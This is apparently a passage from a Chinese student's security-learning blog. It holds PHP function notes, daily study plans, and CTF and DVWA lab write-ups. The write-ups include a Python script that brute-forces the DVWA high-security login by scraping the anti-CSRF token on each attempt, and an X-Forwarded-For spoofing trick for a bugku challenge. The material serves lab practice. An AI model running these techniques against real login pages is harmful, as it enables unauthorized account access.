<h3 id="stripos（不区分大小写）"><a href="#stripos（不区分大小写）" class="headerlink" title="stripos（不区分大小写）"></a>stripos（不区分大小写）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stripos(string,find,start)</span><br></pre></td></tr></table></figure>

<ul>
<li>string:被搜索的字符串【必须】</li>
<li>start:(数字)开始的位置 【必须】</li>
<li>start:规定开始搜索的位置【可选】</li>
</ul>
<p>返回字符串在另一字符串中<strong>第一次</strong>出现的位置，如果没有找到字符串则返回 FALSE。<strong>注释：</strong>字符串位置从 0 开始，不是从 1 开始。</p>
<ul>
<li><a href="https://www.runoob.com/php/func-string-strripos.html" target="_blank" rel="noopener">strripos()</a> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</li>
<li><a href="https://www.runoob.com/php/func-string-strpos.html" target="_blank" rel="noopener">strpos()</a> - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</li>
<li><a href="https://www.runoob.com/php/func-string-strrpos.html" target="_blank" rel="noopener">strrpos()</a> - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</li>
</ul>
<p>以strpos为底，不区分大小写加i，最后一次出现加r</p>
]]></content>
      <categories>
        <category>php 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-23日目标</title>
    <url>/2020/02/22/2020-02-23%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-23日目标"><a href="#2020-02-23日目标" class="headerlink" title="2020-02-23日目标"></a>2020-02-23日目标</h2><table>
<thead>
<tr>
<th>7：30</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>8：00-9：00</td>
<td>英语</td>
</tr>
<tr>
<td>9：30-10：45</td>
<td>DVWA Weak Session IDs</td>
</tr>
<tr>
<td>11：00-12：00</td>
<td>sql书</td>
</tr>
<tr>
<td>14：00-15：30</td>
<td>c语言</td>
</tr>
<tr>
<td>15：45-17：00</td>
<td>DVWA (CSP) Bypass</td>
</tr>
<tr>
<td>19：00-20：00</td>
<td>数学</td>
</tr>
<tr>
<td>20：15-21：30</td>
<td>刷题</td>
</tr>
<tr>
<td></td>
<td>睡觉</td>
</tr>
</tbody></table>
<h2 id="2020-02-22总结"><a href="#2020-02-22总结" class="headerlink" title="2020-02-22总结"></a>2020-02-22总结</h2><ol>
<li>了解了DVWA upload的方法，可是中国菜刀怎么都连不上，心态有点崩</li>
<li>整理了php查询函数</li>
<li>预习了高数第一单元第一节</li>
<li>Dvwa insecure  CAPTCHA</li>
<li>看了教学视频，大致了解了c语言指针</li>
<li>读了sql第二章第一部分</li>
<li></li>
</ol>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-22日目标</title>
    <url>/2020/02/21/2020-02-22%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-22日目标"><a href="#2020-02-22日目标" class="headerlink" title="2020-02-22日目标"></a>2020-02-22日目标</h2><table>
<thead>
<tr>
<th>7：30</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>8：00-9：00</td>
<td>英语</td>
</tr>
<tr>
<td>9：30-10：30</td>
<td>file upload</td>
</tr>
<tr>
<td>10：45-12：00</td>
<td>预习高数</td>
</tr>
<tr>
<td>14：00-15：15</td>
<td>Insecure CAPTCHA</td>
</tr>
<tr>
<td>15：30-17：00</td>
<td>C语言指针</td>
</tr>
<tr>
<td>19：00-20：00</td>
<td>sql书</td>
</tr>
<tr>
<td>20：15-…</td>
<td>刷刷题，整理整理</td>
</tr>
<tr>
<td>24：00</td>
<td>上床</td>
</tr>
</tbody></table>
<h2 id="2020-02-21总结"><a href="#2020-02-21总结" class="headerlink" title="2020-02-21总结"></a>2020-02-21总结</h2><ol>
<li>浏览了sql的第一单元</li>
<li>完成了DVWA file inclusion</li>
<li>下了个DEV-C++（我比较菜暂时用不惯vs2017）</li>
<li>看了了解了c语言指针</li>
<li>做了DVWA file upload部分</li>
</ol>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>bugku管理员系统</title>
    <url>/2020/02/20/bugku%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<p>任意输入用户名密码：</p>
<p><img src="/2020/02/20/bugku%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/7.png" alt="7"></p>
<p>想到伪造IP地址的http头：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP </p>
</blockquote>
<p>改一下头，然后在源代码找到个base64一解密是管理员的密码</p>
<p>成功。</p>
]]></content>
      <tags>
        <tag>http</tag>
        <tag>抓包</tag>
      </tags>
  </entry>
  <entry>
    <title>用脚本破解dvwa的brute—-force</title>
    <url>/2020/02/20/%E7%94%A8%E8%84%9A%E6%9C%AC%E7%A0%B4%E8%A7%A3dvwa%E7%9A%84brute%E2%80%94-force/</url>
    <content><![CDATA[<p>先来看看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Brute Force Source</span><br><span class="line">vulnerabilities/brute/source/high.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_GET[ <span class="string">'username'</span> ];</span><br><span class="line">    $user = stripslashes( $user );</span><br><span class="line">    $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $user ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_GET[ <span class="string">'password'</span> ];</span><br><span class="line">    $pass = stripslashes( $pass );</span><br><span class="line">    $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $row    = mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar = $row[<span class="string">"avatar"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得出两点结论：</p>
<ol>
<li>因为mysqli_real_escape_string的存在，无法使用sql注入</li>
<li>因为每次对token的验证，无法直接使用burpsuite暴力破解</li>
</ol>
<p>于是想到自己用python写脚本，可是我不会，怎么办呢，先来研究下别人的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">header=&#123;<span class="string">'Host'</span>:<span class="string">'127.0.0.1'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">'Accept'</span>:<span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">'Accept-Language'</span>:<span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">'Referer'</span>:<span class="string">'http://127.0.0.1/vulnerabilities/brute/'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">'cookie'</span>:<span class="string">'PHPSESSID=8p4kb7jc1df431lo6qe249quv2; security=high'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">'Connection'</span>:<span class="string">'close'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">'Upgrade-Insecure-Requests'</span>:<span class="string">'1'</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">requrl=<span class="string">"http://127.0.0.1/vulnerabilities/brute/"</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">(requrl,header)</span>:</span></span><br><span class="line"></span><br><span class="line">    response=requests.get(url=requrl,headers=header)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> (response.status_code,len(response.content))</span><br><span class="line"></span><br><span class="line">    soup=BeautifulSoup(response.text,<span class="string">"html.parser"</span>)</span><br><span class="line"></span><br><span class="line">    input=soup.form.select(<span class="string">"input[type='hidden']"</span>)   <span class="comment">#返回的是一个list列表</span></span><br><span class="line"></span><br><span class="line">    user_token=input[<span class="number">0</span>][<span class="string">'value'</span>]                   <span class="comment">#获取用户的token</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> user_token</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">user_token=get_token(requrl,header)</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">"E:\Password\mima.txt"</span>):</span><br><span class="line"></span><br><span class="line">    requrl=<span class="string">"http://127.0.0.1/vulnerabilities/brute/?username=admin&amp;password="</span>+line.strip()+<span class="string">"&amp;Login=Login&amp;user_token="</span>+user_token</span><br><span class="line"></span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> (i , <span class="string">'admin'</span> ,line.strip(),end=<span class="string">"  "</span>)</span><br><span class="line"></span><br><span class="line">    user_token=get_token(requrl,header)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">20</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>



<h2 id="import-requests"><a href="#import-requests" class="headerlink" title="import requests"></a>import requests</h2><p><a href="https://www.cnblogs.com/lanyinhao/p/9634742.html" target="_blank" rel="noopener">参考文章</a></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">r1 = requests.get(url=<span class="string">'url'</span>, params=&#123;<span class="string">'wd'</span>: <span class="string">'python'</span>&#125;)</span><br><span class="line">print(r1.url)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; url?wd=python</span><br></pre></td></tr></table></figure>

<p><strong>params为可选项</strong></p>
<h3 id="几种方法"><a href="#几种方法" class="headerlink" title="几种方法"></a>几种方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1   requests.get(‘https:&#x2F;&#x2F;github.com&#x2F;timeline.json’)                         # GET请求</span><br><span class="line">2   requests.post(“http:&#x2F;&#x2F;httpbin.org&#x2F;post”)                                 # POST请求</span><br><span class="line">3   requests.put(“http:&#x2F;&#x2F;httpbin.org&#x2F;put”)                                   # PUT请求</span><br><span class="line">4   requests.delete(“http:&#x2F;&#x2F;httpbin.org&#x2F;delete”)                             # DELETE请求</span><br><span class="line">5   requests.head(“http:&#x2F;&#x2F;httpbin.org&#x2F;get”)                                  # HEAD请求</span><br><span class="line">6   requests.options(“http:&#x2F;&#x2F;httpbin.org&#x2F;get” )                              # OPTIONS请求</span><br></pre></td></tr></table></figure>

<h3 id="响应的内容"><a href="#响应的内容" class="headerlink" title="响应的内容"></a>响应的内容</h3><ul>
<li><p>r.encoding                           #获取当前的编码</p>
</li>
<li><p>r.encoding = ‘utf-8’             #设置编码</p>
</li>
<li><p>r.text                                     #以encoding解析返回内容。字符串方式的响应体，会自动根据响应头部的字符编码进行解码。</p>
</li>
<li><p>r.content                              #以字节形式（二进制）返回。字节方式的响应体，会自动为你解码 gzip 和 deflate 压缩。</p>
</li>
<li><p>r.cookie                                #返回cookie</p>
</li>
<li><p>r.headers                             #以字典对象存储服务器响应头，但是这个字典比较特殊，字典键不区分大小写，若键不存在则返回None</p>
</li>
<li><p>r.status_code                      #响应状态码</p>
</li>
<li><p>r.raw                                    #返回原始响应体，也就是 urllib 的 response 对象，使用 r.raw.read()   </p>
</li>
<li><p>r.ok                                      # 查看r.ok的布尔值便可以知道是否登陆成功</p>
</li>
</ul>
<p>   #<em>特殊方法</em>#</p>
<ul>
<li><p>r.json()                                #Requests中内置的JSON解码器，以json形式返回,前提返回的内容确保是json格式的，不然解析出错会抛异常</p>
</li>
<li><p>r.raise_for_status()            #失败请求(非200响应)抛出异常</p>
</li>
</ul>
<p><img src="/2020/02/20/%E7%94%A8%E8%84%9A%E6%9C%AC%E7%A0%B4%E8%A7%A3dvwa%E7%9A%84brute%E2%80%94-force/1.png" alt="1"></p>
<h3 id="定制头和cookie信息"><a href="#定制头和cookie信息" class="headerlink" title="定制头和cookie信息"></a>定制头和cookie信息</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">header = &#123;<span class="string">'user-agent'</span>: <span class="string">'my-app/0.0.1'</span><span class="string">'&#125; </span></span><br><span class="line"><span class="string">cookie = &#123;'</span>key<span class="string">':'</span>value<span class="string">'&#125; </span></span><br><span class="line"><span class="string">r = requests.get/post('</span>your url<span class="string">',headers=header,cookies=cookie)</span></span><br></pre></td></tr></table></figure>







<h2 id="BeautifulSoup"><a href="#BeautifulSoup" class="headerlink" title="BeautifulSoup"></a>BeautifulSoup</h2><p><a href="https://www.cnblogs.com/scios/p/8652760.html" target="_blank" rel="noopener">参考文章</a></p>
<p>页面的源代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"#"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">			Username:<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">			Password:<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">AUTOCOMPLETE</span>=<span class="string">"off"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Login"</span> <span class="attr">name</span>=<span class="string">"Login"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'user_token'</span> <span class="attr">value</span>=<span class="string">'0871b3a033e5e832172e1c0931b3fc95'</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">soup &#x3D; BeautifulSoup(html_doc, &#39;html.parser&#39;, from_encoding&#x3D;&#39;utf-8&#39;)</span><br></pre></td></tr></table></figure>



<p>而对于脚本里的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">input&#x3D;soup.form.select(&quot;input[type&#x3D;&#39;hidden&#39;]&quot;)</span><br></pre></td></tr></table></figure>

<p>大致意思是，在form标签里寻找input标签，而这个input标签的type要是hidden</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user_token&#x3D;input[0][&#39;value&#39;]</span><br></pre></td></tr></table></figure>

<p>然后获取这个input标签里的第一个value（即token）</p>
<p><strong>当然，还有其他获取方法：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user_token &#x3D; soup.find_all(&#39;input&#39;)[3].get(&#39;value&#39;)</span><br><span class="line">user_token &#x3D; soup.form.input.input.input.input[&quot;value&quot;]</span><br></pre></td></tr></table></figure>

<p>都代表找到第四个input</p>
<h2 id="end-“-”"><a href="#end-“-”" class="headerlink" title="end=“  ”"></a>end=“  ”</h2><p>在python中，print里最后加上end=“  ”，可以起到不换行效果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print (i , &#39;admin&#39; ,line.strip(),end&#x3D;&quot;  &quot;)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-21日目标</title>
    <url>/2020/02/20/2020-02-21%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-21目标"><a href="#2020-02-21目标" class="headerlink" title="2020-02-21目标"></a>2020-02-21目标</h2><table>
<thead>
<tr>
<th>8：00</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>8：00-9：00</td>
<td>英语听力加朗读</td>
</tr>
<tr>
<td>9：30-10：30</td>
<td>sqli-lab 11-12【阳光好看书】</td>
</tr>
<tr>
<td>10：45-12：00</td>
<td>预习高数</td>
</tr>
<tr>
<td>14：00-15：00</td>
<td>DVWA file inclusion</td>
</tr>
<tr>
<td>15：15-17：00</td>
<td>沉迷c语言</td>
</tr>
<tr>
<td>19：00-20：00</td>
<td>DVWA file upload</td>
</tr>
<tr>
<td>20：15-21：30</td>
<td>刷刷题</td>
</tr>
<tr>
<td>21：30-0：00</td>
<td>看看书放松放松</td>
</tr>
<tr>
<td></td>
<td>上床</td>
</tr>
</tbody></table>
<h2 id="2020-02-20总结"><a href="#2020-02-20总结" class="headerlink" title="2020-02-20总结"></a>2020-02-20总结</h2><ol>
<li>整理了php过滤函数</li>
<li>dvwa的xss（Reflected）</li>
<li>dvwa的xss（Stored）</li>
<li>装好了gcc【今日最大收获】</li>
<li>用最简单的方法基本解决了c任务</li>
<li>解决了brute force的high难度并整理了脚本</li>
<li>写了脚本解决了bugku的post</li>
<li>做了bugku的web4和输入密码</li>
</ol>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>php常见的过滤函数</title>
    <url>/2020/02/20/php%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h3 id><a href="#" class="headerlink" title></a></h3><h3 id="trim"><a href="#trim" class="headerlink" title="trim()"></a>trim()</h3><p>trim函数移除字符串两侧的空白字符或其他预定义字符.</p>
<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">trim(string,charlist)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>string</em></td>
<td>必需。规定要检查的字符串。</td>
</tr>
<tr>
<td><em>charlist</em></td>
<td>可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：”\0” - NULL     “\t” - 制表符     “\n” - 换行      “\x0B” - 垂直制表符     “\r” - 回车     “ “ - 空格</td>
</tr>
</tbody></table>
<h4 id="类似"><a href="#类似" class="headerlink" title="类似"></a>类似</h4><ol>
<li>ltrim() - 移除字符串左侧的空白字符或其他预定义字符。</li>
<li>rtrim() - 移除字符串右侧的空白字符或其他预定义字符。</li>
</ol>
<h3 id="mysqli-real-escape-string"><a href="#mysqli-real-escape-string" class="headerlink" title="mysqli_real_escape_string()"></a>mysqli_real_escape_string()</h3><p>mysqli_real_escape_string对字符串特殊符号（\x00，\n，\r，\，‘，“，\x1a）等进行转义，转义成sql语句。</p>
<h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqli_real_escape_string(connection,escapestring);</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>connection</em></td>
<td>必需。规定要使用的 MySQL 连接。</td>
</tr>
<tr>
<td><em>escapestring</em></td>
<td>必需。要转义的字符串。编码的字符是 NUL（ASCII 0）、\n、\r、\、’、” 和 Control-Z。</td>
</tr>
</tbody></table>
<h3 id="stripslashes-string-："><a href="#stripslashes-string-：" class="headerlink" title="stripslashes(string)："></a>stripslashes(string)：</h3><p>去除掉string字符的反斜杠＼</p>
<h3 id="addslashes-string-："><a href="#addslashes-string-：" class="headerlink" title="addslashes(string)："></a>addslashes(string)：</h3><p> addslashes() 函数返回在预定义的字符前添加反斜杠的字符串。</p>
<p>预定义字符是：</p>
<ul>
<li>单引号（’）</li>
<li>双引号（”）</li>
<li>反斜杠（\）</li>
<li>NULL</li>
</ul>
<h3 id="strip-tags"><a href="#strip-tags" class="headerlink" title="strip_tags()"></a>strip_tags()</h3><p>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签。</p>
<h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strip_tags(string,allow)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>string</em></td>
<td>必需。规定要检查的字符串。</td>
</tr>
<tr>
<td><em>allow</em></td>
<td>可选。规定允许的标签。这些标签不会被删除。</td>
</tr>
</tbody></table>
<h3 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars()"></a>htmlspecialchars()</h3><p>在php中，htmlspecialchars()函数是使用来把一些预定义的字符转换为HTML实体，返回转换后的新字符串，原字符串不变。</p>
<p><strong>被转换的预定义的字符有：</strong></p>
<p>&amp;：转换为&amp;</p>
<p>“：转换为&quot;</p>
<p>‘：转换为成为 ‘</p>
<p>&lt;：转换为&lt;</p>
<h5 id="gt-：转换为-gt"><a href="#gt-：转换为-gt" class="headerlink" title="&gt;：转换为&gt;"></a>&gt;：转换为&gt;</h5><h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">htmlspecialchars(string,flags,character-set,double_encode)</span><br></pre></td></tr></table></figure>

<p>具体参数解释见 <a href="https://www.runoob.com/php/func-string-htmlspecialchars.html" target="_blank" rel="noopener">菜鸟教程</a></p>
<h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h3><p>函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] &#x3D;&gt; 290</span><br><span class="line">    [1] &#x3D;&gt; 69</span><br><span class="line">    [2] &#x3D;&gt; 3</span><br><span class="line">    [3] &#x3D;&gt; width&#x3D;&quot;290&quot; height&#x3D;&quot;69&quot;</span><br><span class="line">    [bits] &#x3D;&gt; 8</span><br><span class="line">    [mime] &#x3D;&gt; image&#x2F;png</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>返回结果说明</p>
<ul>
<li>索引 0 给出的是图像宽度的像素值</li>
<li>索引 1 给出的是图像高度的像素值</li>
<li>索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM</li>
<li>索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签</image></li>
<li>索引 bits 给出的是图像的每种颜色的位数，二进制格式</li>
<li>索引 channels 给出的是图像的通道值，RGB 图像默认是 3</li>
<li>索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header(“Content-type: image/jpeg”);</li>
</ul>
]]></content>
      <categories>
        <category>php 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-20日目标</title>
    <url>/2020/02/19/2020-02-20%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-18日目标"><a href="#2020-02-18日目标" class="headerlink" title="2020-02-18日目标"></a>2020-02-18日目标</h2><table>
<thead>
<tr>
<th>8：00</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>8：00-9：00</td>
<td>英语听力，朗读，背单词</td>
</tr>
<tr>
<td>9：30-10：30</td>
<td>XSS(reflected)【太阳好的话看会书】</td>
</tr>
<tr>
<td>11:00-12:00</td>
<td>c语言菜单程序</td>
</tr>
<tr>
<td>14：00-15：00</td>
<td>brute force的high级别</td>
</tr>
<tr>
<td>15：30-17：00</td>
<td>buu和bugku刷刷题</td>
</tr>
<tr>
<td>19：00-20：00</td>
<td>预习高数</td>
</tr>
<tr>
<td>20：30-21：30</td>
<td>sqli-labs 11-12【心情好的话看看书】</td>
</tr>
<tr>
<td>21：45-22：30</td>
<td>总结下未完成的东西【搞完了就dvwa往后做】</td>
</tr>
<tr>
<td></td>
<td>上床</td>
</tr>
</tbody></table>
<h2 id="2020-02-19总结"><a href="#2020-02-19总结" class="headerlink" title="2020-02-19总结"></a>2020-02-19总结</h2><ol>
<li>做了dvwa的CSRF，做到high级时要用到关于XSS的知识</li>
<li>做了XSS（DOM）所有级别</li>
<li>想完成c语言做菜单的程序，但是遇到了一个问题：</li>
</ol>
<p>如何在一个c程序里运行另一个c程序，用system的话只能打开未编译的文本文件，于是明天想想</p>
<ol>
<li>看能不能把要用的c文件先编译一下</li>
<li>或者看看运用头文件引用是否可行</li>
<li>尝试一下bat文件？</li>
</ol>
<p>哦对，还和forest官方发了邮件，希望能找回以前的帐号</p>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-17日目标</title>
    <url>/2020/02/16/2020-02-17%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-17日目标"><a href="#2020-02-17日目标" class="headerlink" title="2020-02-17日目标"></a>2020-02-17日目标</h2><table>
<thead>
<tr>
<th>起床</th>
<th>9：00</th>
</tr>
</thead>
<tbody><tr>
<td>项目（外星人入侵地球）</td>
<td>10：00-12：00</td>
</tr>
<tr>
<td>dvwa：CSRF</td>
<td>15：00-16：30</td>
</tr>
<tr>
<td>看看书，数学通识</td>
<td>16：30-dinner</td>
</tr>
<tr>
<td>项目（外星人入侵地球）</td>
<td>19：30-21：30</td>
</tr>
